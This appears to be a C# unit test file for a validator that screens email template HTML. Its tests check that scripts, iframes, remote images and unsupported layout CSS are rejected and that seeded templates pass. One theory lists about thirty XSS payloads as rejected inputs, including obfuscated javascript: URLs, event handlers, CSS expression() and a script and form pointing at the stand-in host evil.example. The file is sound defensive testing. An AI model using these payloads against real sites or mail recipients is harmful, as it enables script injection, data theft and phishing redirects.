using TaxVision.Scribe.Application.Templates.BaseLayouts;
using TaxVision.Scribe.Application.Templates.Seed;
using TaxVision.Scribe.Application.Templates.Validation;

namespace TaxVision.Scribe.Tests.Templates.Validation;

public sealed class EmailHtmlSafetyValidatorTests
{
    private readonly EmailHtmlSafetyValidator _validator = new();

    [Fact]
    public void Validate_rejects_flexbox()
    {
        var outcome = _validator.Validate("<div style=\"display:flex;\">x</div>");

        Assert.False(outcome.IsAcceptable);
        Assert.Contains(outcome.Errors, e => e.Code == "EmailHtmlSafety.Flexbox");
    }

    [Fact]
    public void Validate_rejects_grid()
    {
        var outcome = _validator.Validate("<div style=\"display: grid;\">x</div>");

        Assert.False(outcome.IsAcceptable);
        Assert.Contains(outcome.Errors, e => e.Code == "EmailHtmlSafety.Grid");
    }

    [Fact]
    public void Validate_rejects_position_absolute()
    {
        var outcome = _validator.Validate("<div style=\"position: absolute;\">x</div>");

        Assert.False(outcome.IsAcceptable);
        Assert.Contains(outcome.Errors, e => e.Code == "EmailHtmlSafety.PositionAbsolute");
    }

    [Fact]
    public void Validate_rejects_position_fixed()
    {
        var outcome = _validator.Validate("<div style=\"position:fixed;\">x</div>");

        Assert.False(outcome.IsAcceptable);
        Assert.Contains(outcome.Errors, e => e.Code == "EmailHtmlSafety.PositionFixed");
    }

    [Fact]
    public void Validate_rejects_external_stylesheet()
    {
        var outcome = _validator.Validate("<link rel=\"stylesheet\" href=\"https://cdn.example.com/x.css\">");

        Assert.False(outcome.IsAcceptable);
        Assert.Contains(outcome.Errors, e => e.Code == "EmailHtmlSafety.ExternalStylesheet");
    }

    [Fact]
    public void Validate_rejects_script()
    {
        var outcome = _validator.Validate("<script>alert(1)</script>");

        Assert.False(outcome.IsAcceptable);
        Assert.Contains(outcome.Errors, e => e.Code == "EmailHtmlSafety.Script");
    }

    [Fact]
    public void Validate_rejects_iframe()
    {
        var outcome = _validator.Validate("<iframe src=\"https://example.com\"></iframe>");

        Assert.False(outcome.IsAcceptable);
        Assert.Contains(outcome.Errors, e => e.Code == "EmailHtmlSafety.Iframe");
    }

    [Fact]
    public void Validate_rejects_remote_image_src()
    {
        var outcome = _validator.Validate("<img src=\"https://cdn.example.com/logo.png\">");

        Assert.False(outcome.IsAcceptable);
        Assert.Contains(outcome.Errors, e => e.Code == "EmailHtmlSafety.RemoteImage");
    }

    [Fact]
    public void Validate_passes_a_cid_image_with_width_and_height()
    {
        var outcome = _validator.Validate("<img src=\"cid:logo-header\" width=\"180\" height=\"60\">");

        Assert.True(outcome.IsAcceptable);
        Assert.Empty(outcome.Warnings);
    }

    [Fact]
    public void Validate_warns_when_an_image_is_missing_width_or_height()
    {
        var outcome = _validator.Validate("<img src=\"cid:logo-header\">");

        Assert.True(outcome.IsAcceptable);
        Assert.Contains(outcome.Warnings, w => w.Code == "EmailHtmlSafety.ImageMissingDimensions");
    }

    [Fact]
    public void Validate_accepts_the_system_base_v1_seed_with_no_errors_or_warnings()
    {
        var outcome = _validator.Validate(BaseLayoutHtml.SystemBaseV1);

        Assert.True(outcome.IsAcceptable);
        Assert.Empty(outcome.Warnings);
    }

    [Fact]
    public void Validate_accepts_the_tenant_base_v1_seed_with_no_errors_or_warnings()
    {
        var outcome = _validator.Validate(BaseLayoutHtml.TenantBaseV1);

        Assert.True(outcome.IsAcceptable);
        Assert.Empty(outcome.Warnings);
    }

    // ---------- Contenido activo (XSS) ----------

    [Theory]
    [InlineData("<img src=\"cid:x\" width=\"1\" height=\"1\" onerror=\"alert(1)\">", "EmailHtmlSafety.EventHandler")]
    [InlineData("<td ONCLICK='alert(1)'>x</td>", "EmailHtmlSafety.EventHandler")]
    [InlineData("<tr><td>ok</td></tr><tr onmouseover=\"alert(1)\"><td>x</td></tr>", "EmailHtmlSafety.EventHandler")]
    [InlineData("<svg><style><img src=x onerror=alert(1)></style></svg>", "EmailHtmlSafety.EventHandler")]
    [InlineData("<form><form action=\"https://evil.example\"></form></form>", "EmailHtmlSafety.Form")]
    [InlineData("<svg onload=alert(1)></svg>", "EmailHtmlSafety.EventHandler")]
    [InlineData("<body onload=\"alert(1)\"><p>x</p></body>", "EmailHtmlSafety.EventHandler")]
    [InlineData("<a href=\"javascript:alert(1)\">x</a>", "EmailHtmlSafety.ScriptUrl")]
    [InlineData("<a href=\" JaVaScRiPt:alert(1)\">x</a>", "EmailHtmlSafety.ScriptUrl")]
    [InlineData("<a href=\"java&#09;script:alert(1)\">x</a>", "EmailHtmlSafety.ScriptUrl")]
    [InlineData("<a href=\"&#106;avascript:alert(1)\">x</a>", "EmailHtmlSafety.ScriptUrl")]
    [InlineData("<a href=\"vbscript:msgbox(1)\">x</a>", "EmailHtmlSafety.ScriptUrl")]
    [InlineData("<a href=\"data:text/html;base64,PHNjcmlwdD4=\">x</a>", "EmailHtmlSafety.ScriptUrl")]
    [InlineData(
        "<img src=\"data:image/svg+xml;base64,PHN2Zz4=\" width=\"1\" height=\"1\">",
        "EmailHtmlSafety.ScriptUrl"
    )]
    [InlineData("<svg><a xlink:href=\"javascript:alert(1)\"><text>x</text></a></svg>", "EmailHtmlSafety.ScriptUrl")]
    [InlineData("<SCRIPT src=\"https://evil.example/x.js\"></SCRIPT>", "EmailHtmlSafety.Script")]
    [InlineData("<svg><script>alert(1)</script></svg>", "EmailHtmlSafety.Script")]
    [InlineData("<noscript><script>alert(1)</script></noscript>", "EmailHtmlSafety.Script")]
    [InlineData("<template><script>alert(1)</script></template>", "EmailHtmlSafety.Script")]
    [InlineData("<!--[if mso]><script>alert(1)</script><![endif]-->", "EmailHtmlSafety.Script")]
    [InlineData("<!--[if mso]><v:rect onclick=\"alert(1)\"></v:rect><![endif]-->", "EmailHtmlSafety.EventHandler")]
    [InlineData("<IFRAME srcdoc=\"x\"></IFRAME>", "EmailHtmlSafety.Iframe")]
    [InlineData("<frameset><frame src=\"https://evil.example\"></frameset>", "EmailHtmlSafety.Iframe")]
    [InlineData("<object data=\"https://evil.example/x.swf\"></object>", "EmailHtmlSafety.Object")]
    [InlineData("<embed src=\"https://evil.example/x.swf\">", "EmailHtmlSafety.Embed")]
    [InlineData("<form action=\"https://evil.example\"><input name=\"p\"></form>", "EmailHtmlSafety.Form")]
    [InlineData("<meta http-equiv=\"Refresh\" content=\"0;url=https://evil.example\">", "EmailHtmlSafety.MetaRefresh")]
    [InlineData("<p style=\"width: expression(alert(1))\">x</p>", "EmailHtmlSafety.CssScript")]
    [InlineData("<p style=\"background:url( 'javascript:alert(1)' )\">x</p>", "EmailHtmlSafety.CssScript")]
    [InlineData("<style>p { background: url(javascript:alert(1)); }</style>", "EmailHtmlSafety.CssScript")]
    public void Validate_rejects_active_content(string html, string expectedCode)
    {
        var outcome = _validator.Validate(html);

        Assert.False(outcome.IsAcceptable);
        Assert.Contains(outcome.Errors, e => e.Code == expectedCode);
    }

    [Fact]
    public void Validate_reports_each_active_content_rule_once()
    {
        var outcome = _validator.Validate("<p onclick=\"a()\" onmouseover=\"b()\">x</p><div onload=\"c()\"></div>");

        Assert.Single(outcome.Errors, e => e.Code == "EmailHtmlSafety.EventHandler");
    }

    [Theory]
    [InlineData("<a href=\"{{ join_link }}\">Join</a>")]
    [InlineData("<p>Hi {{ first_name | default: 'there' }}</p>{% if has_card %}<p>{{ card_brand }}</p>{% endif %}")]
    [InlineData("<table>{% for item in items %}<tr><td>{{ item.name }}</td></tr>{% endfor %}</table>")]
    [InlineData("<td style=\"color: {{ brand_color }};\">{% unless is_final %}Next{% endunless %}</td>")]
    [InlineData(
        "<a href=\"mailto:{{ support_email }}\">Support</a> <a href=\"https://www.taxoffix.io/{{ path }}\">Go</a>"
    )]
    [InlineData("<img src=\"data:image/png;base64,iVBORw0KGgo=\" width=\"1\" height=\"1\" alt=\"Turn on images\">")]
    [InlineData(
        "<!--[if mso]><table role=\"presentation\"><tr><td>x</td></tr></table><![endif]--><!-- onclick=\"x\" -->"
    )]
    [InlineData("<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">")]
    [InlineData("<p>Use <code>&lt;script&gt;</code> and javascript: carefully, online.</p>")]
    public void Validate_does_not_flag_liquid_placeholders_or_benign_markup(string html)
    {
        var outcome = _validator.Validate(html);

        Assert.True(outcome.IsAcceptable, string.Join(", ", outcome.Errors.Select(e => e.Code)));
    }

    public static TheoryData<string> SeededHtmlKeys()
    {
        var keys = new TheoryData<string> { "layout:system-base", "layout:tenant-base" };
        var seeds = NotificationTemplateSeedSource.All.ToList();
        for (var index = 0; index < seeds.Count; index++)
            if (!string.IsNullOrEmpty(seeds[index].Html))
                keys.Add($"template:{index}:{seeds[index].TemplateKey}");
        return keys;
    }

    // Todo HTML que el arranque siembra (layouts base + plantillas) tiene que seguir pasando el preflight.
    [Theory]
    [MemberData(nameof(SeededHtmlKeys))]
    public void Validate_accepts_every_seeded_layout_and_template(string key)
    {
        var html = key switch
        {
            "layout:system-base" => BaseLayoutHtml.SystemBaseV1,
            "layout:tenant-base" => BaseLayoutHtml.TenantBaseV1,
            _ => NotificationTemplateSeedSource.All.ElementAt(int.Parse(key.Split(':')[1])).Html,
        };

        var outcome = _validator.Validate(html);

        Assert.True(outcome.IsAcceptable, $"{key}: {string.Join(", ", outcome.Errors.Select(e => e.Code))}");
    }
}
